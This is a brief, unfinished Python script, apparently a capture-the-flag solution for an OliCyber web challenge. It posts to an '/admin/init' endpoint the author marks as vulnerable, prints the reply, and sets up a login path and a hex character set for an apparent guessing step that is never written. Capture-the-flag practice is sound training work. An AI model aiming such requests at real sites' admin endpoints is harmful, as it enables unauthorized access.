import requests

url="http://zio-frank.challs.olicyber.it"
vunerabile="/admin/init"
url_vunerabile=url+vunerabile
r=requests.post(url_vunerabile)
print(r.text)
login="/login.html"
dictionary = '0123456789abcdef'
